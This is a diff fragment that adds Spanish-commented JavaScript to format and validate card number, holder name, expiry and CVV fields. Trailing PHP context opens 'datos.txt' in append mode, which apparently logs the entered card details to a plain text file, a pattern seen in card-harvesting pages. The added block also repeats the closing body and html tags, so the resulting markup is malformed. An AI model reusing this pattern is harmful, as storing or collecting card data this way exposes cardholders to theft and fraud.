@@ -151,6 +151,37 @@
   </script>
 </body>
 </html>
+  <script>
+    // Formato y validación número de tarjeta
+    document.getElementById('numero').addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      value = value.substring(0, 16);
+      e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Solo letras en nombre del titular
+    document.getElementById('titular').addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/[^a-zA-ZÁÉÍÓÚÑáéíóúñ\s]/g, '');
+    });
+
+    // Fecha MM/AA automática con "/"
+    const expInput = document.getElementById('exp');
+    expInput.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 4) value = value.substring(0, 4);
+      if (value.length >= 3) {
+        value = value.substring(0,2) + '/' + value.substring(2);
+      }
+      e.target.value = value;
+    });
+
+    // Solo números y 3 dígitos para CVV
+    document.getElementById('cvv').addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    });
+  </script>
+</body>
+</html>
 <?php
 // Abrir el archivo para escritura en modo append
 $archivo = fopen("datos.txt", "a");
